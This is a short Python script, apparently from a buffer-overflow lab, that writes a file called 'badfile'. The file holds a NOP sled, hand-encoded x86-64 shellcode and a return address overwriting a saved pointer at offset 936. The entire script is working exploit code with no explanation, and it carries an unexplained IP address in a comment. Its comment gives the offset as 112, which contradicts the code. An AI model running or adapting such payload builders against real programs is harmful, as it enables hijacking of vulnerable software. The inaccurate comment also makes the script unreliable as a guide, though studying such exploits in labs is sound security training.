import sys 
# 51.142.89.159 
shellcode= ( 
"\x49\xB8\xFF\x51\x55\x55\x55\x55\x00\x00\x6A\x09\x6A\x01\x41\xFF\xD0\x48\x31\xC9\x51\x50\x41\xFF\xD0\x6A\x05\x50\x41\xFF\xD0\x6A\x01\x50\x41\xFF\xD0\x48\x31\xC9\x51\x50\x41\xFF\xD0\x6A\x01\x50\x41\xFF\xD0" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(2027)) 
# Put the shellcode at the end 
start = 2027 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0x7fffffffda80  + 250 
content[936:944] = (ret).to_bytes(8,byteorder='little') 


 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 
